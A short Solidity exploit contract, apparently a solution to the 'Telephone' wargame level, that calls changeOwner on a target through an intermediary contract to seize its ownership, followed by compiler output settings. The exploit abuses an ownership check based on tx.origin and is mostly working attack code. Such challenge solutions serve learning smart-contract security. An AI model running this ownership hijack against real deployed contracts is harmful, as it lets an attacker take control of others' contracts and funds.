pragma solidity ^0.8.0;

interface TelephoneInterface {
  function changeOwner(address _owner) external; 
}


contract TelephoneAttack {
    address public admin;
    
    constructor() {
        admin = msg.sender;
    }
    
    function attack(address _target) public {
        require(admin == msg.sender);
        TelephoneInterface Telephone = TelephoneInterface(_target);
        Telephone.changeOwner(msg.sender);
    } 
}

{
  "optimizer": {
    "enabled": false,
    "runs": 200
  },
  "outputSelection": {
    "*": {
      "*": [
        "evm.bytecode",
        "evm.deployedBytecode",
        "abi"
      ]
    }
  }
}